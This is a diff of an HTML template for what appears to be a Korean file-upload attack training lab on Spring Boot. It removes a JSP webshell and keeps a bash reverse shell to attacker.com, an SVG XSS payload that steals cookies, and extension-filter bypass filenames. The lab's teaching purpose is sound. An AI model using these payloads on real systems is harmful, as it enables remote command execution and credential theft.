@@ -23,30 +23,9 @@
     <!-- ===== 공격 파일 유형 안내 ===== -->
     <h5 class="fw-bold border-bottom pb-2 mb-3">공격 파일 유형 — Spring Boot 환경 기준</h5>
 
-    <!-- JSP -->
-    <div class="attack-hint mb-3">
-        <strong>① JSP 웹쉘 (webshell.jsp) — 전통적인 Java 웹쉘</strong>
-        <div class="code-block-wrap mt-2">
-            <button class="btn-copy-block" onclick="copyBlock(this)">복사</button>
-            <div class="code-block">&lt;%@ page import="java.io.*" %&gt;
-&lt;%
-    String cmd = request.getParameter("cmd");
-    Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",cmd});
-    InputStream is = p.getInputStream();
-    int c; while((c = is.read()) != -1) out.print((char)c);
-%&gt;</div>
-        </div>
-        <small class="d-block mt-1">→ 업로드 후 <code>?cmd=id</code>, <code>?cmd=cat+/etc/passwd</code> 등으로 서버 명령 실행</small>
-        <div class="mt-2 p-2 border rounded" style="font-size:.82rem; background:#f8f9fa;">
-            <strong>⚠ Spring Boot 제약:</strong> 내장 Tomcat은 기본적으로 JSP를 실행하지 않습니다.
-            <code>tomcat-embed-jasper</code> 의존성이 없으면 업로드해도 실행 안 됨.
-            이 프로젝트에는 해당 의존성이 없으므로 JSP 웹쉘은 동작하지 않습니다.
-        </div>
-    </div>
-
     <!-- Groovy -->
     <div class="attack-hint mb-3">
-        <strong>② Groovy 웹쉘 (shell.groovy) — Spring Boot + Groovy 환경</strong>
+        <strong>① Groovy 웹쉘 (shell.groovy) — Spring Boot + Groovy 환경</strong>
         <div class="code-block-wrap mt-2">
             <button class="btn-copy-block" onclick="copyBlock(this)">복사</button>
             <div class="code-block">// Groovy webshell - executed by Groovy script engine
@@ -66,7 +45,7 @@ out.println(proc.text)</div>
 
     <!-- Linux shell script -->
     <div class="attack-hint mb-3">
-        <strong>③ Linux 쉘 스크립트 (backdoor.sh) — cron / 스크립트 실행 환경</strong>
+        <strong>② Linux 쉘 스크립트 (backdoor.sh) — cron / 스크립트 실행 환경</strong>
         <div class="code-block-wrap mt-2">
             <button class="btn-copy-block" onclick="copyBlock(this)">복사</button>
             <div class="code-block">#!/bin/bash
@@ -91,13 +70,13 @@ bash -i &gt;&amp; /dev/tcp/attacker.com/4444 0&gt;&amp;1</div>
 
     <!-- SVG / HTML -->
     <div class="attack-hint mb-3">
-        <strong>④ SVG / HTML — 브라우저 XSS (서버 실행 없이 쿠키 탈취)</strong>
+        <strong>③ SVG / HTML — 브라우저 XSS (서버 실행 없이 쿠키 탈취)</strong>
         <div class="code-block-wrap mt-2">
             <button class="btn-copy-block" onclick="copyBlock(this)">복사</button>
             <div class="code-block">&lt;!-- payload.svg --&gt;
 &lt;svg xmlns="http://www.w3.org/2000/svg"&gt;
   &lt;script&gt;
-    new Image().src='http://attacker.com/steal?c='+document.cookie;
+    new Image().src='/demo/steal?c='+document.cookie;
     alert('SVG XSS: ' + document.cookie);
   &lt;/script&gt;
 &lt;/svg&gt;</div>
@@ -107,12 +86,12 @@ bash -i &gt;&amp; /dev/tcp/attacker.com/4444 0&gt;&amp;1</div>
 
     <!-- Extension bypass -->
     <div class="attack-hint mb-4">
-        <strong>⑤ 확장자 필터 우회 기법</strong>
+        <strong>④ 확장자 필터 우회 기법</strong>
         <ul class="mb-0 mt-1">
-            <li>이중 확장자: <code>shell.jpg.jsp</code><button class="btn-copy" onclick="copyCode(this)">복사</button></li>
-            <li>대소문자: <code>shell.JSP</code> / <code>shell.Jsp</code><button class="btn-copy" onclick="copyCode(this)">복사</button></li>
-            <li>null 바이트 (구형 서버): <code>shell.jsp%00.jpg</code><button class="btn-copy" onclick="copyCode(this)">복사</button></li>
-            <li>Content-Type 위조: <code>image/jpeg</code>로 전송하면서 실제 내용은 JSP</li>
+            <li>이중 확장자: <code>shell.jpg.groovy</code><button class="btn-copy" onclick="copyCode(this)">복사</button></li>
+            <li>대소문자: <code>shell.SH</code> / <code>shell.Sh</code><button class="btn-copy" onclick="copyCode(this)">복사</button></li>
+            <li>null 바이트 (구형 서버): <code>shell.sh%00.jpg</code><button class="btn-copy" onclick="copyCode(this)">복사</button></li>
+            <li>Content-Type 위조: <code>image/jpeg</code>로 전송하면서 실제 내용은 스크립트</li>
         </ul>
     </div>
 
